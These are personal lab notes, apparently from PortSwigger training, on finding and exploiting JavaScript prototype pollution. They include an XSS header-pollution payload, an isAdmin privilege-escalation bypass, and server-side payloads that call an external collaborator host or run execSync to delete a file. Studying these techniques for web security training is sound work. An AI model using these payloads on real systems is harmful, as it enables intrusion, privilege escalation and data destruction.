---
description: Prototype pollution notes for the first couple labs
---

# ⛽ Prototype Pollution

* [https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#scanning-for-prototype-pollution-gadgets](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#scanning-for-prototype-pollution-gadgets) - DOM Invader
* Find source that allows adding properties to global prototype
  * `website.com/?__proto__[foo]=bar`
  * Check `Object.protoype.foo` in web console
    * Try with other techniques, formats, etc.
  * Can automated with DOM Invader
* Finding gadgets
  *   Manually

      1. Find properties used by the app or imported libraries in code
      2. Intercept Response, not request, with found JS
      3. Add debugger statement to start the script and forwards remaining HTTP
      4. Go to page loading the target script with Burp's Browser
      5. Enter the following in the web console to have log to console when accessed

      ```javascript
      Object.defineProperty(Object.prototype, 'YOUR-PROPERTY/GADGET', {
        get() {
            console.trace();
            return 'polluted';
        }
      })
      ```

      6. Press the continue button and check the console for stack trace
      7. Jump to the link in the stack trace that shows where the property is read
      8. Step through the execution phases to search for DOM Sink
  * Use DOM Invader
  * Use Breakpoints in console debugger for troubleshooting broken exploits
* Header Pollution - `?__proto__[headers][x-username]=<img/src/onerror=alert(1)>`
* Check for JS files filtering for common injection strings

**Server Side**

* Detecting when not reflected
* Status code override
  1. Trigger error response and note status code
  2. Pollute prototype with your own status code that shouldn't normally happen
     * Not 500
  3. Trigger error response and check if status code overridden

```json
"__proto__": {
    "status":555
}
```

* JSON spaces
  * override json spaces option in Express framework then view a JSON response
  * Make sure to edit JSON in RAW when using Burp
  * version 4.17.4
* Charset override
  * Object properties visible in a response
  * Add arbitrary UTF-7 encoded string to reflected property
  * Send request
  * pollute protype with content-type property to specify UTF-7
  * Repeat first request and check if the role was decoded

```http
{
	"sessionId":"0123456789",
	"username":"wiener",
	"role":"+AGYAbwBv-"
}
```

```http
{
"sessionId":"0123456789",
"username":"wiener",
"role":"default",
"__proto__":{
	"content-type": "application/json; charset=utf-7"
}
}
```

```http
{
	"sessionId":"0123456789",
	"username":"wiener",
	"role":"foo"
}
```

* Scanning for server-side prototype pollution sources
  * Server-Side Prototype Pollution Scanner extension
  * Select list of items from HTTP History
  * right click and use extension
* Bypassing input filters for server-side proto pollution
  * Obfuscate prohibited keywords
  * Use constructor property instead of \_\_proto\_\_

```json
"constructor": {
    "prototype": {
        "isAdmin":true
	    }
	}
```

* Detecting Server-Side Prototype Pollution

```json
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=jbykzmsium655a5p72jx48q4xv3mrcf1.oastify.com\"\".oastify\"\".com"
}}
```

```json
"__proto__": {
    "shell":"node",
 "execArgv": [
    "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
	]
}
```
